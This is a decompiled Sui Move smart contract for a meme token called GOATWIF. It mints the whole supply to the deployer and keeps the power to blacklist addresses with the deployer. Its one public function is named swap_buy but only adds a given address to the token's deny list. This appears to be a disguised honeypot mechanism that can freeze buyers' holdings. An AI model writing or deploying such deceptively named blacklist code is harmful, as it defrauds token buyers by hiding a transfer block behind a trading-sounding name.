module 0x82f32337992ea44dbc7fed19b0d5a07568f29659c5333c54bb8293747fbd3eb1::goatwif {
    struct GOATWIF has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: GOATWIF, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<GOATWIF>(arg0, 9, b"GOATWIF", b"Goatseus Wiffimus", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmNQCYKwuSno6a9i2wZH1V2WM6iRDzLBmBeM2QNrbigKDS"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<GOATWIF>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<GOATWIF>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<GOATWIF>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<GOATWIF>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GOATWIF>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<GOATWIF>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

